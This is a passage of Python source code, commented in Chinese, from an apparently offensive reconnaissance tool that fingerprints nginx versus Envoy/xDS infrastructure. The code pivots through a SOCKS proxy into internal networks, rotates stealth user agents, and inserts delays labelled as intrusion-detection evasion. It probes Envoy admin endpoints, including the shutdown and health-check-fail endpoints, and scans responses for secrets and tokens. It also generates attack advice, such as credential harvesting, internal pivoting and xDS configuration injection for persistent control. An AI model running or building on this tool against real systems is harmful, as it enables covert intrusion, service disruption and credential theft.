        avg_time = sum(connection_times) / len(connection_times)
        
        # 分析时间戳间隔
        timestamps = [conn['timestamp'] for conn in connections]
        time_gaps = [timestamps[i] - timestamps[i-1] for i in range(1, len(timestamps))]
        
        # 判断机制类型
        if time_variance > avg_time * 0.5:  # 连接时间波动大
            mechanism = "LIKELY_RELOAD_BASED"
            evidence = f"High connection time variance: {time_variance:.1f}ms (avg: {avg_time:.1f}ms)"
            implications = "Process restarts cause connection time variation - traditional nginx architecture"
        else:
            mechanism = "LIKELY_HOT_RELOAD"
            evidence = f"Stable connection times: variance {time_variance:.1f}ms (avg: {avg_time:.1f}ms)"
            implications = "Consistent performance suggests hot reload capability - modern architecture"
        
        return {
            'mechanism': mechanism,
            'evidence': evidence,
            'implications': implications
        }
    
    async def _detect_envoy_characteristics(self, scan_mode: str, proxy_info: Optional[Dict] = None) -> Dict:
        """检测Envoy代理特征 - 双模支持"""
        try:
            envoy_indicators = {
                'response_headers': [],
                'error_pages': [],
                'admin_interface': {},
                'http2_support': False,
                'scan_mode': scan_mode
            }
            
            # 1. 检测Envoy特有的响应头
            header_test = await self._test_envoy_headers(scan_mode, proxy_info)
            envoy_indicators['response_headers'] = header_test
            
            # 2. 检测Envoy错误页面
            error_test = await self._test_envoy_error_pages(scan_mode, proxy_info)
            envoy_indicators['error_pages'] = error_test
            
            # 3. HTTP/2支持检测（仅外网模式，内网模式通过代理较复杂）
            if scan_mode == 'external':
                http2_test = await self._test_http2_support()
                envoy_indicators['http2_support'] = http2_test
            else:
                envoy_indicators['http2_support'] = False  # 代理模式下跳过HTTP/2检测
            
            # 综合判断 - 双模权重调整
            envoy_score = 0
            if any('envoy' in str(header).lower() for header in header_test):
                envoy_score += 3
            if error_test.get('envoy_error_format', False):
                envoy_score += 2
            if envoy_indicators['http2_support']:
                envoy_score += 1
            
            # 扫描模式调整
            if scan_mode == 'internal':
                # 内网模式下，即使分数较低也更可能是真实的Envoy
                confidence_multiplier = 1.3
                envoy_score = min(envoy_score * confidence_multiplier, 6)
            else:
                confidence_multiplier = 1.0
            
            return {
                'likely_envoy': envoy_score >= 2,  # 降低阈值以适应双模
                'confidence_score': envoy_score,
                'indicators': envoy_indicators,
                'evidence': f"Envoy indicators score: {envoy_score}/6 ({scan_mode} mode)",
                'scan_mode': scan_mode,
                'confidence_multiplier': confidence_multiplier
            }
            
        except Exception as e:
            return {
                'likely_envoy': False,
                'confidence_score': 0,
                'indicators': {'scan_mode': scan_mode},
                'evidence': f"Envoy detection failed: {e}",
                'scan_mode': scan_mode
            }
    
    async def _test_envoy_headers(self, scan_mode: str, proxy_info: Optional[Dict] = None) -> List[str]:
        """测试Envoy特有的响应头 - 双模支持"""
        envoy_headers = []
        
        try:
            # 根据模式调用健康检查
            if scan_mode == 'internal' and proxy_info:
                # 内网模式需要特殊处理
                response_info = await self._send_health_check_via_proxy(proxy_info)
            else:
                response_info = await self._send_health_check()
            
            # 检查响应中的Envoy特有头部（这里简化处理）
            envoy_headers.append(f"Header test completed in {scan_mode} mode")
            
        except Exception:
            pass
        
        return envoy_headers
    
    async def _send_health_check_via_proxy(self, proxy_info: Dict) -> Dict:
        """通过代理发送健康检查"""
        try:
            reader, writer = await self._create_proxy_connection(self.target_port, proxy_info)
            
            request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {self.target_host}\r\n"
                f"User-Agent: {random.choice(STEALTH_CONFIG['user_agents'])}\r\n"
                f"Connection: close\r\n\r\n"
            )
            
            writer.write(request.encode())
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(1024), timeout=self.timeout)
            
            writer.close()
            await writer.wait_closed()
            
            response_text = response.decode('utf-8', errors='ignore')
            if 'HTTP/' in response_text:
                status_line = response_text.split('\r\n')[0]
                status_code = status_line.split(' ')[1] if len(status_line.split(' ')) > 1 else 'Unknown'
            else:
                status_code = 'Unknown'
            
            return {
                'status': status_code,
                'response_size': len(response),
                'response_preview': response_text[:200],
                'via_proxy': True
            }
            
        except Exception as e:
            return {
                'status': 'Error',
                'response_size': 0,
                'response_preview': '',
                'via_proxy': True,
                'error': str(e)
            }
    
    async def _test_envoy_error_pages(self, scan_mode: str, proxy_info: Optional[Dict] = None) -> Dict:
        """测试Envoy错误页面格式 - 双模支持"""
        try:
            # 根据模式选择连接方式
            if proxy_info and scan_mode == 'internal':
                reader, writer = await self._create_proxy_connection(self.target_port, proxy_info)
                user_agent = random.choice(STEALTH_CONFIG['user_agents'])
            else:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_host, self.target_port),
                    timeout=self.timeout
                )
                user_agent = "EnvoyErrorProbe/1.0"
            
            error_request = (
                f"GET /nonexistent-envoy-test-path-{scan_mode} HTTP/1.1\r\n"
                f"Host: {self.target_host}\r\n"
                f"User-Agent: {user_agent}\r\n"
                f"Connection: close\r\n\r\n"
            )
            
            writer.write(error_request.encode())
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(1024), timeout=3.0)
            response_text = response.decode('utf-8', errors='ignore')
            
            writer.close()
            await writer.wait_closed()
            
            # 检测Envoy错误页面特征
            envoy_error_indicators = [
                'envoy', 'upstream', 'cluster', 'route', 'listener', 'filter'
            ]
            
            found_indicators = [indicator for indicator in envoy_error_indicators 
                              if indicator in response_text.lower()]
            
            return {
                'envoy_error_format': len(found_indicators) >= 2,
                'found_indicators': found_indicators,
                'response_preview': response_text[:300],
                'scan_mode': scan_mode,
                'via_proxy': proxy_info is not None
            }
            
        except Exception as e:
            return {
                'envoy_error_format': False,
                'found_indicators': [],
                'response_preview': '',
                'scan_mode': scan_mode,
                'via_proxy': proxy_info is not None,
                'error': str(e)
            }
    
    async def _test_http2_support(self) -> bool:
        """测试HTTP/2支持"""
        try:
            # 简化的HTTP/2检测
            if self.target_port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ctx.set_alpn_protocols(['h2', 'http/1.1'])
                
                sock = socket.create_connection((self.target_host, self.target_port), self.timeout)
                ssock = ctx.wrap_socket(sock, server_hostname=self.target_host)
                
                # 检查协商的协议
                selected_protocol = ssock.selected_alpn_protocol()
                ssock.close()
                
                return selected_protocol == 'h2'
            
            return False
            
        except Exception:
            return False
    
    def _analyze_server_header_differences(self, control_responses: List[Dict], data_responses: List[Dict]) -> bool:
        """分析服务器头部差异"""
        if not control_responses or not data_responses:
            return False
        
        control_servers = {resp.get('server_header', '') for resp in control_responses}
        data_servers = {resp.get('server_header', '') for resp in data_responses}
        
        # 如果控制面和数据面返回不同的服务器头，说明可能是分离架构
        return len(control_servers.intersection(data_servers)) == 0 and len(control_servers) > 0 and len(data_servers) > 0
    
    def _analyze_architecture_type(self, indicators: Dict, scan_mode: str) -> Dict:
        """综合分析架构类型 - 双模感知版本"""
        architecture_score = {
            'traditional_nginx': 0,
            'modern_cloud_native': 0,
            'hybrid': 0
        }
        
        # 扫描模式上下文
        scan_context = indicators.get('scan_context', {})
        
        # xDS检测结果 - 双模权重调整
        xds_data = indicators['xds_protocol']
        if xds_data['xds_detected']:
            if scan_mode == 'internal':
                architecture_score['modern_cloud_native'] += 4  # 内网发现xDS更可信
            else:
                architecture_score['modern_cloud_native'] += 2  # 外网暴露xDS是严重问题但分数较低
        else:
            if scan_mode == 'external':
                architecture_score['traditional_nginx'] += 1  # 外网没发现可能是好的安全实践
            else:
                architecture_score['traditional_nginx'] += 3  # 内网没发现更确定是传统架构
        
        # 控制面分离检测 - 双模差异分析
        separation = indicators['control_data_separation']['separation_level']
        if separation == 'SEPARATED_ARCHITECTURE':
            architecture_score['modern_cloud_native'] += 4
        elif separation == 'EXTERNAL_CONTROL_EXPOSED':
            architecture_score['modern_cloud_native'] += 2  # 架构现代但安全糟糕
        elif separation == 'TRADITIONAL_ARCHITECTURE':
            architecture_score['traditional_nginx'] += 4
        elif separation == 'TRADITIONAL_OR_WELL_SECURED':
            architecture_score['traditional_nginx'] += 2
        else:
            architecture_score['hybrid'] += 1
        
        # 配置重载机制
        reload_mechanism = indicators['config_reload_mechanism']['reload_mechanism']
        if reload_mechanism == 'LIKELY_HOT_RELOAD':
            architecture_score['modern_cloud_native'] += 2
        elif reload_mechanism == 'LIKELY_RELOAD_BASED':
            architecture_score['traditional_nginx'] += 2
        
        # Envoy特征 - 双模权重
        envoy_data = indicators['envoy_features']
        if envoy_data['likely_envoy']:
            confidence_multiplier = envoy_data.get('confidence_multiplier', 1.0)
            base_score = 3 * confidence_multiplier
            architecture_score['modern_cloud_native'] += min(base_score, 5)
        
        # 内网专属：管理接口分析
        if scan_mode == 'internal' and 'admin_interfaces' in indicators:
            admin_data = indicators['admin_interfaces']
            if admin_data.get('discovered_interfaces'):
                architecture_score['modern_cloud_native'] += 2
        
        # 确定最可能的架构类型
        max_score = max(architecture_score.values())
        likely_type = [k for k, v in architecture_score.items() if v == max_score][0]
        
        # 双模置信度计算
        total_score = sum(architecture_score.values())
        base_confidence = max_score / total_score if total_score > 0 else 0
        
        # 扫描模式置信度调整
        if scan_mode == 'internal':
            # 内网扫描置信度更高
            confidence = min(base_confidence * 1.2, 1.0)
        else:
            # 外网扫描置信度适中
            confidence = base_confidence * 0.9
        
        # 内外网差异评估
        internal_exposure = self._assess_internal_vs_external_exposure(indicators, scan_mode)
        
        # 安全影响分析 - 考虑扫描模式
        security_implications = self._get_security_implications_dual_mode(likely_type, indicators, scan_mode)
        attack_recommendations = self._get_attack_recommendations_dual_mode(likely_type, indicators, scan_mode)
        
        return {
            'type': likely_type,
            'confidence': confidence,
            'scores': architecture_score,
            'scan_mode': scan_mode,
            'security_implications': security_implications,
            'attack_recommendations': attack_recommendations,
            'internal_exposure': internal_exposure
        }
    
    def _assess_internal_vs_external_exposure(self, indicators: Dict, scan_mode: str) -> str:
        """评估内外网暴露差异"""
        try:
            xds_detected = indicators['xds_protocol']['xds_detected']
            separation_level = indicators['control_data_separation']['separation_level']
            
            if scan_mode == 'external':
                if xds_detected or separation_level == 'EXTERNAL_CONTROL_EXPOSED':
                    return "CRITICAL_EXTERNAL_EXPOSURE"
                else:
                    return "GOOD_EXTERNAL_POSTURE"
            else:  # internal
                admin_interfaces = indicators.get('admin_interfaces', {})
                admin_count = len(admin_interfaces.get('discovered_interfaces', []))
                
                if admin_count >= 3:
                    return "HIGH_INTERNAL_EXPOSURE"
                elif admin_count >= 1:
                    return "MODERATE_INTERNAL_EXPOSURE"
                else:
                    return "LIMITED_INTERNAL_EXPOSURE"
        
        except Exception:
            return "ASSESSMENT_ERROR"
    
    def _get_security_implications_dual_mode(self, arch_type: str, indicators: Dict, scan_mode: str) -> List[str]:
        """获取双模安全影响分析"""
        implications = []
        
        try:
            base_implications = self._get_security_implications(arch_type, indicators)
            implications.extend(base_implications)
            
            # 添加模式特定的安全影响
            if scan_mode == 'external':
                implications.extend([
                    f"External scan perspective: Limited visibility into internal architecture",
                    f"External security posture assessment based on publicly accessible services"
                ])
                
                if indicators['xds_protocol']['xds_detected']:
                    implications.insert(0, "CRITICAL: Cloud-native control plane exposed to external networks!")
            
            else:  # internal
                implications.extend([
                    f"Internal scan perspective: Comprehensive architecture visibility achieved",
                    f"Internal security assessment reveals actual deployment architecture"
                ])
                
                admin_interfaces = indicators.get('admin_interfaces', {})
                if admin_interfaces.get('discovered_interfaces'):
                    implications.append("Internal admin interfaces accessible - potential privilege escalation path")
        
        except Exception:
            implications.append("Security implications analysis failed")
        
        return implications
    
    def _get_attack_recommendations_dual_mode(self, arch_type: str, indicators: Dict, scan_mode: str) -> List[str]:
        """获取双模攻击建议"""
        recommendations = []
        
        try:
            base_recommendations = self._get_attack_recommendations(arch_type, indicators)
            recommendations.extend(base_recommendations)
            
            # 添加模式特定的攻击建议
            if scan_mode == 'external':
                recommendations.extend([
                    "Establish internal foothold for comprehensive architecture analysis",
                    "Focus on credential acquisition for internal pivot"
                ])
                
                if not indicators['xds_protocol']['xds_detected']:
                    recommendations.append("Good external security - prioritize social engineering and application vulns")
            
            else:  # internal
                recommendations.extend([
                    "Leverage internal access for direct control plane attacks",
                    "Target admin interfaces for immediate privilege escalation"
                ])
                
                admin_interfaces = indicators.get('admin_interfaces', {})
                if admin_interfaces.get('discovered_interfaces'):
                    recommendations.append("Exploit accessible admin interfaces for service manipulation")
                
                # xDS特定建议
                if indicators['xds_protocol']['xds_detected']:
                    recommendations.append("Attempt xDS configuration injection for persistent control")
        
        except Exception:
            recommendations.append("Attack recommendation analysis failed")
        
        return recommendations
    
    def _get_security_implications(self, arch_type: str, indicators: Dict) -> List[str]:
        """获取安全影响分析"""
        implications = []
        
        if arch_type == 'traditional_nginx':
            implications.extend([
                "Control plane and data plane are likely co-located - single point of failure",
                "Configuration updates require process reload - potential for service disruption",
                "Limited observability into internal architecture",
                "Classic nginx vulnerabilities may apply"
            ])
        elif arch_type == 'modern_cloud_native':
            implications.extend([
                "Separated control and data planes - more resilient architecture", 
                "xDS protocol in use - new attack surface for configuration manipulation",
                "Hot reload capability - better availability but complex configuration flow",
                "Envoy proxy features - additional attack vectors through advanced routing"
            ])
        else:  # hybrid
            implications.extend([
                "Mixed architecture - combining traditional and modern approaches",
                "Potentially inconsistent security posture across components",
                "Complex attack surface with multiple entry points"
            ])
        
        return implications
    
    def _get_attack_recommendations(self, arch_type: str, indicators: Dict) -> List[str]:
        """获取攻击建议"""
        recommendations = []
        
        if arch_type == 'traditional_nginx':
            recommendations.extend([
                "Focus on nginx-specific vulnerabilities and misconfigurations",
                "Test for configuration injection attacks",
                "Exploit reload-based availability issues",
                "Target single process for maximum impact"
            ])
        elif arch_type == 'modern_cloud_native':
            recommendations.extend([
                "Investigate xDS protocol exploitation opportunities",
                "Test Envoy-specific attack vectors",
                "Probe control plane isolation boundaries", 
                "Analyze Wasm plugin attack surface"
            ])
        else:  # hybrid
            recommendations.extend([
                "Map all architectural components separately",
                "Test for inconsistencies between traditional and modern components",
                "Look for configuration synchronization vulnerabilities"
            ])
        
        return recommendations
    
    async def _create_proxy_connection(self, port: int, proxy_info: Dict) -> Tuple:
        """通过SOCKS代理创建连接"""
        if not SOCKS_AVAILABLE:
            raise Exception("SOCKS proxy support not available. Install PySocks: pip install PySocks")
        
        try:
            # 创建SOCKS5代理socket
            proxy_sock = socks.socksocket()
            proxy_sock.set_proxy(socks.SOCKS5, proxy_info['host'], proxy_info['port'])
            
            # 连接到目标
            proxy_sock.settimeout(self.timeout)
            proxy_sock.connect((self.target_host, port))
            
            # 转换为asyncio StreamReader/Writer
            reader, writer = await asyncio.open_connection(sock=proxy_sock)
            return reader, writer
            
        except Exception as e:
            raise Exception(f"Proxy connection failed: {e}")
    
    def _extract_envoy_version(self, response_text: str) -> Dict:
        """从Envoy响应中提取版本信息"""
        version_info = {
            'envoy_version': 'Unknown',
            'build_type': 'Unknown',
            'ssl_version': 'Unknown'
        }
        
        try:
            lines = response_text.split('\n')
            for line in lines:
                if 'server.version' in line.lower():
                    # 解析版本信息，格式通常为 server.version: 1.18.3/Clean/RELEASE/BoringSSL
                    parts = line.split(':')
                    if len(parts) > 1:
                        version_parts = parts[1].strip().split('/')
                        if len(version_parts) >= 1:
                            version_info['envoy_version'] = version_parts[0]
                        if len(version_parts) >= 3:
                            version_info['build_type'] = version_parts[2]
                        if len(version_parts) >= 4:
                            version_info['ssl_version'] = version_parts[3]
                elif 'envoy' in line.lower() and 'version' in line.lower():
                    # 备用版本提取方法
                    version_info['envoy_version'] = 'Detected'
        except Exception:
            pass
        
        return version_info
    
    def _analyze_admin_exposure(self, response_text: str, scan_mode: str) -> Dict:
        """分析admin接口暴露风险"""
        exposure_analysis = {
            'risk_level': 'Unknown',
            'exposed_endpoints': [],
            'sensitive_info': [],
            'security_implications': []
        }
        
        try:
            # 检查暴露的敏感信息
            sensitive_patterns = [
                ('cluster configuration', 'cluster.'),
                ('listener configuration', 'listener.'),
                ('runtime configuration', 'runtime.'),
                ('certificate information', 'ssl.'),
                ('upstream health', 'health_check'),
                ('request statistics', 'http.'),
                ('memory usage', 'server.memory')
            ]
            
            for desc, pattern in sensitive_patterns:
                if pattern in response_text.lower():
                    exposure_analysis['sensitive_info'].append(desc)
            
            # 风险评估
            exposure_count = len(exposure_analysis['sensitive_info'])
            if exposure_count >= 5:
                exposure_analysis['risk_level'] = 'CRITICAL'
                exposure_analysis['security_implications'].extend([
                    "Full Envoy configuration exposed",
                    "Internal network topology discoverable",
                    "Certificate and key information may be accessible"
                ])
            elif exposure_count >= 3:
                exposure_analysis['risk_level'] = 'HIGH'
                exposure_analysis['security_implications'].extend([
                    "Significant configuration details exposed",
                    "Attack surface enumeration possible"
                ])
            elif exposure_count >= 1:
                exposure_analysis['risk_level'] = 'MEDIUM'
                exposure_analysis['security_implications'].append("Some configuration details exposed")
            else:
                exposure_analysis['risk_level'] = 'LOW'
            
            # 模式特定的风险评估
            if scan_mode == 'external' and exposure_count > 0:
                exposure_analysis['security_implications'].append("CRITICAL: Admin interface exposed to external networks!")
            elif scan_mode == 'internal' and exposure_count > 0:
                exposure_analysis['security_implications'].append("Admin interface accessible from internal network")
            
        except Exception:
            exposure_analysis['risk_level'] = 'ERROR'
        
        return exposure_analysis
    
    def _calculate_xds_confidence(self, endpoints: List[Dict], scan_mode: str) -> float:
        """计算xDS检测置信度"""
        if not endpoints:
            return 0.0
        
        confidence = 0.0
        
        for endpoint in endpoints:
            # 基础分数
            if endpoint['type'] == 'admin_interface':
                confidence += 0.3
            elif endpoint['type'] == 'grpc_endpoint':
                confidence += 0.4
            
            # 端口特定加分
            port = endpoint['port']
            if port in [15000, 15001]:  # 标准Envoy admin端口
                confidence += 0.3
            elif port in [9901, 19000]:  # 其他常见管理端口
                confidence += 0.2
            
            # Envoy特征加分
            response = endpoint.get('response', {})
            if response.get('likely_envoy', False):
                confidence += 0.2
        
        # 模式调整
        if scan_mode == 'internal':
            confidence *= 1.2  # 内网检测更可信
        
        return min(confidence, 1.0)
    
    def _generate_xds_implications(self, endpoints: List[Dict], scan_mode: str) -> str:
        """生成xDS检测的安全含义"""
        if not endpoints:
            if scan_mode == 'external':
                return "No xDS endpoints detected externally - may indicate traditional architecture or good security posture"
            else:
                return "No xDS endpoints detected internally - likely traditional architecture"
        
        endpoint_count = len(endpoints)
        admin_count = sum(1 for ep in endpoints if ep['type'] == 'admin_interface')
        grpc_count = sum(1 for ep in endpoints if ep['type'] == 'grpc_endpoint')
        
        if scan_mode == 'external':
            return f"SECURITY ALERT: {endpoint_count} xDS endpoints exposed externally ({admin_count} admin, {grpc_count} gRPC) - serious security risk!"
        else:
            return f"Cloud-native architecture confirmed: {endpoint_count} xDS endpoints detected internally ({admin_count} admin, {grpc_count} gRPC)"
    
    def _assess_internal_exposure(self, endpoints: List[Dict], scan_mode: str) -> str:
        """评估内网暴露情况"""
        if scan_mode == 'external':
            if endpoints:
                return "CRITICAL - Control plane exposed to external network"
            else:
                return "Good - No control plane exposure detected externally"
        else:
            if endpoints:
                admin_exposed = any(ep['type'] == 'admin_interface' for ep in endpoints)
                if admin_exposed:
                    return "HIGH - Admin interfaces accessible from internal network"
                else:
                    return "MEDIUM - Some control plane endpoints accessible internally"
            else:
                return "LOW - No control plane endpoints detected"
    
    async def _deep_admin_interface_scan(self, proxy_info: Dict) -> Dict:
        """深度管理接口扫描（仅内网模式）"""
        print(f"[*] Performing deep admin interface analysis...")
        
        admin_analysis = {
            'discovered_interfaces': [],
            'configuration_exposure': {},
            'security_posture': {},
            'attack_vectors': []
        }
        
        try:
            # 扩展的管理端口列表
            extended_admin_ports = [15000, 15001, 15010, 15011, 15014, 9901, 19000, 8080, 9090]
            
            for port in extended_admin_ports:
                try:
                    # HIDS规避延迟
                    await asyncio.sleep(random.uniform(0.3, 1.0))
                    
                    interface_info = await self._analyze_admin_interface(port, proxy_info)
                    if interface_info['accessible']:
                        admin_analysis['discovered_interfaces'].append(interface_info)
                        
                except Exception:
                    continue
            
            # 配置暴露分析
            config_exposure = await self._analyze_configuration_exposure(admin_analysis['discovered_interfaces'])
            admin_analysis['configuration_exposure'] = config_exposure
            
            # 安全态势评估
            security_posture = self._assess_admin_security_posture(admin_analysis['discovered_interfaces'])
            admin_analysis['security_posture'] = security_posture
            
            # 攻击向量识别
            attack_vectors = self._identify_admin_attack_vectors(admin_analysis['discovered_interfaces'])
            admin_analysis['attack_vectors'] = attack_vectors
            
        except Exception as e:
            admin_analysis['error'] = str(e)
        
        return admin_analysis
    
    async def _analyze_admin_interface(self, port: int, proxy_info: Dict) -> Dict:
        """分析单个管理接口"""
        interface_info = {
            'port': port,
            'accessible': False,
            'endpoints': [],
            'authentication': 'Unknown',
            'sensitive_data': []
        }
        
        try:
            reader, writer = await self._create_proxy_connection(port, proxy_info)
            
            # 测试多个管理端点
            test_endpoints = [
                '/stats', '/clusters', '/config_dump', '/server_info',
                '/ready', '/quitquitquit', '/healthcheck/fail'
            ]
            
            for endpoint in test_endpoints:
                try:
                    request = (
                        f"GET {endpoint} HTTP/1.1\r\n"
                        f"Host: {self.target_host}:{port}\r\n"
                        f"User-Agent: {random.choice(STEALTH_CONFIG['user_agents'])}\r\n"
                        f"Connection: close\r\n\r\n"
                    )
                    
                    writer.write(request.encode())
                    await writer.drain()
                    
                    response = await asyncio.wait_for(reader.read(1024), timeout=3.0)
                    response_text = response.decode('utf-8', errors='ignore')
                    
                    if 'HTTP/' in response_text:
                        status_code = response_text.split(' ')[1] if len(response_text.split(' ')) > 1 else '000'
                        interface_info['endpoints'].append({
                            'endpoint': endpoint,
                            'status': status_code,
                            'accessible': status_code in ['200', '202']
                        })
                        
                        if status_code == '200':
                            interface_info['accessible'] = True
                            
                            # 检查敏感数据
                            if any(keyword in response_text.lower() for keyword in ['password', 'secret', 'key', 'token']):
                                interface_info['sensitive_data'].append(endpoint)
                    
                    # 重新建立连接用于下一个端点
                    writer.close()
                    await writer.wait_closed()
                    reader, writer = await self._create_proxy_connection(port, proxy_info)
                    
                except Exception:
                    continue
            
            writer.close()
            await writer.wait_closed()
            
        except Exception as e:
            interface_info['error'] = str(e)
        
        return interface_info
    
    async def _analyze_configuration_exposure(self, interfaces: List[Dict]) -> Dict:
        """分析配置暴露情况"""
        config_exposure = {
            'exposed_configs': [],
            'risk_level': 'LOW',
            'attack_opportunities': []
        }
        
        try:
            total_exposed = 0
            critical_exposed = 0
            
            for interface in interfaces:
                accessible_endpoints = [ep for ep in interface['endpoints'] if ep['accessible']]
                total_exposed += len(accessible_endpoints)
                
                # 检查关键配置端点
                critical_endpoints = ['/config_dump', '/clusters', '/server_info']
                for endpoint in accessible_endpoints:
                    if endpoint['endpoint'] in critical_endpoints:
                        critical_exposed += 1
                        config_exposure['exposed_configs'].append({
                            'port': interface['port'],
                            'endpoint': endpoint['endpoint'],
                            'criticality': 'HIGH'
                        })
                
                # 检查敏感数据
                if interface['sensitive_data']:
                    config_exposure['attack_opportunities'].extend([
                        f"Sensitive data exposed on port {interface['port']}: {', '.join(interface['sensitive_data'])}"
                    ])
            
            # 风险评估
            if critical_exposed >= 3:
                config_exposure['risk_level'] = 'CRITICAL'
            elif critical_exposed >= 1:
                config_exposure['risk_level'] = 'HIGH'
            elif total_exposed >= 5:
                config_exposure['risk_level'] = 'MEDIUM'
            
        except Exception as e:
            config_exposure['error'] = str(e)
        
        return config_exposure
    
    def _assess_admin_security_posture(self, interfaces: List[Dict]) -> Dict:
        """评估管理接口安全态势"""
        security_posture = {
            'overall_risk': 'LOW',
            'vulnerabilities': [],
            'recommendations': [],
            'exposed_ports': []
        }
        
        try:
            exposed_count = len(interfaces)
            dangerous_endpoints = 0
            unauthenticated_access = 0
            
            for interface in interfaces:
                security_posture['exposed_ports'].append(interface['port'])
                
                # 检查危险端点
                dangerous_eps = [ep for ep in interface['endpoints'] 
                               if ep['accessible'] and ep['endpoint'] in ['/quitquitquit', '/healthcheck/fail']]
                dangerous_endpoints += len(dangerous_eps)
                
                # 检查认证状态
                if interface['authentication'] == 'Unknown' or not interface.get('authentication_required', True):
                    unauthenticated_access += 1
            
            # 漏洞识别
            if dangerous_endpoints > 0:
                security_posture['vulnerabilities'].append(f"Service control endpoints accessible ({dangerous_endpoints} found)")
            
            if unauthenticated_access > 0:
                security_posture['vulnerabilities'].append(f"Unauthenticated admin access possible ({unauthenticated_access} interfaces)")
            
            if exposed_count >= 3:
                security_posture['vulnerabilities'].append("Multiple admin interfaces exposed")
            
            # 风险评估
            vulnerability_count = len(security_posture['vulnerabilities'])
            if vulnerability_count >= 2 or dangerous_endpoints > 0:
                security_posture['overall_risk'] = 'CRITICAL'
            elif vulnerability_count >= 1 or exposed_count >= 2:
                security_posture['overall_risk'] = 'HIGH'
            elif exposed_count >= 1:
                security_posture['overall_risk'] = 'MEDIUM'
            
            # 安全建议
            if exposed_count > 0:
                security_posture['recommendations'].extend([
                    "Restrict admin interface access to authorized networks only",
                    "Implement strong authentication for admin endpoints",
                    "Monitor admin interface access logs"
                ])
            
            if dangerous_endpoints > 0:
                security_posture['recommendations'].append("Disable or protect service control endpoints")
            
        except Exception as e:
            security_posture['error'] = str(e)
        
        return security_posture
    
    def _identify_admin_attack_vectors(self, interfaces: List[Dict]) -> List[Dict]:
        """识别管理接口攻击向量"""
        attack_vectors = []
        
        try:
            for interface in interfaces:
                port = interface['port']
                
                for endpoint_info in interface['endpoints']:
                    if endpoint_info['accessible']:
                        endpoint = endpoint_info['endpoint']
                        
                        # 基于端点类型识别攻击向量
                        if endpoint == '/config_dump':
                            attack_vectors.append({
                                'type': 'Information_Disclosure',
                                'target': f"{port}{endpoint}",
                                'description': 'Full Envoy configuration dump accessible',
                                'impact': 'HIGH',
                                'exploitation': 'Direct access to sensitive configuration data'
                            })
                        
                        elif endpoint == '/clusters':
                            attack_vectors.append({
                                'type': 'Network_Reconnaissance',
                                'target': f"{port}{endpoint}",
                                'description': 'Backend cluster information exposed',
                                'impact': 'MEDIUM',
                                'exploitation': 'Internal network topology discovery'
                            })
                        
                        elif endpoint == '/quitquitquit':
                            attack_vectors.append({
                                'type': 'Denial_of_Service',
                                'target': f"{port}{endpoint}",
                                'description': 'Service shutdown endpoint accessible',
                                'impact': 'CRITICAL',
                                'exploitation': 'Remote service shutdown via HTTP request'
                            })
                        
                        elif endpoint == '/healthcheck/fail':
                            attack_vectors.append({
                                'type': 'Service_Manipulation',
                                'target': f"{port}{endpoint}",
                                'description': 'Health check manipulation possible',
                                'impact': 'HIGH',
                                'exploitation': 'Force service to fail health checks'
                            })
                        
                        elif endpoint == '/stats':
                            attack_vectors.append({
                                'type': 'Information_Disclosure',
                                'target': f"{port}{endpoint}",
                                'description': 'Detailed runtime statistics exposed',
                                'impact': 'MEDIUM',
                                'exploitation': 'Performance and usage pattern analysis'
                            })
                
                # 检查敏感数据暴露
                if interface['sensitive_data']:
                    attack_vectors.append({
                        'type': 'Credential_Exposure',
                        'target': f"{port} (multiple endpoints)",
                        'description': 'Sensitive authentication data exposed',
                        'impact': 'CRITICAL',
                        'exploitation': 'Credential harvesting from admin responses'
                    })
        
        except Exception as e:
            attack_vectors.append({
                'type': 'Analysis_Error',
                'target': 'Unknown',
                'description': f'Attack vector analysis failed: {e}',
                'impact': 'UNKNOWN',
                'exploitation': 'Manual analysis required'
            })
        
        return attack_vectors
    
    def _analyze_scan_mode_impact(self, control_responses: List[Dict], data_responses: List[Dict], scan_mode: str) -> Dict:
        """分析扫描模式对结果的影响"""
        impact_analysis = {
            'mode_advantage': 'Unknown',
            'coverage_completeness': 0.0,
            'security_implications': []
        }
        
        try:
            total_responses = len(control_responses) + len(data_responses)
            
            if scan_mode == 'external':
                if total_responses == 0:
                    impact_analysis['mode_advantage'] = 'Good_Security_Posture'
                    impact_analysis['coverage_completeness'] = 1.0
                    impact_analysis['security_implications'].append("No services exposed externally - good security practice")
                elif len(control_responses) > 0:
                    impact_analysis['mode_advantage'] = 'Critical_Exposure_Detected'
                    impact_analysis['coverage_completeness'] = 0.3
                    impact_analysis['security_implications'].append("CRITICAL: Control plane exposed to external networks")
                else:
                    impact_analysis['mode_advantage'] = 'Normal_Web_Exposure'
                    impact_analysis['coverage_completeness'] = 0.6
                    impact_analysis['security_implications'].append("Standard web services exposed - normal pattern")
            
            else:  # internal mode
                if total_responses >= 6:
                    impact_analysis['mode_advantage'] = 'Comprehensive_Internal_Access'
                    impact_analysis['coverage_completeness'] = 0.9
                    impact_analysis['security_implications'].append("Full internal architecture visibility achieved")
                elif total_responses >= 3:
                    impact_analysis['mode_advantage'] = 'Partial_Internal_Access'
                    impact_analysis['coverage_completeness'] = 0.7
                    impact_analysis['security_implications'].append("Good internal architecture coverage")
                else:
                    impact_analysis['mode_advantage'] = 'Limited_Internal_Access'
                    impact_analysis['coverage_completeness'] = 0.4
                    impact_analysis['security_implications'].append("Limited internal visibility - may need deeper access")
        
        except Exception:
            impact_analysis['mode_advantage'] = 'Analysis_Error'
        
        return impact_analysis
    
    def _assess_separation_security_impact(self, separation_level: str, scan_mode: str) -> List[str]:
        """评估分离架构的安全影响"""
        security_impacts = []
        
        try:
            if separation_level == "EXTERNAL_CONTROL_EXPOSED":
                security_impacts.extend([
                    "CRITICAL SECURITY RISK: Control plane accessible from external networks",
                    "Immediate action required: Block external access to control plane",
                    "Potential for complete infrastructure compromise"
                ])
            
            elif separation_level == "SEPARATED_ARCHITECTURE" and scan_mode == 'internal':
                security_impacts.extend([
                    "Modern cloud-native architecture detected",
                    "Control/data plane separation provides better resilience",
                    "Focus attacks on xDS protocol and admin interfaces"
                ])
            
            elif separation_level == "TRADITIONAL_ARCHITECTURE":
                security_impacts.extend([
                    "Traditional monolithic architecture",
                    "Single point of failure - control and data combined",
                    "Focus on nginx-specific vulnerabilities"
                ])
            
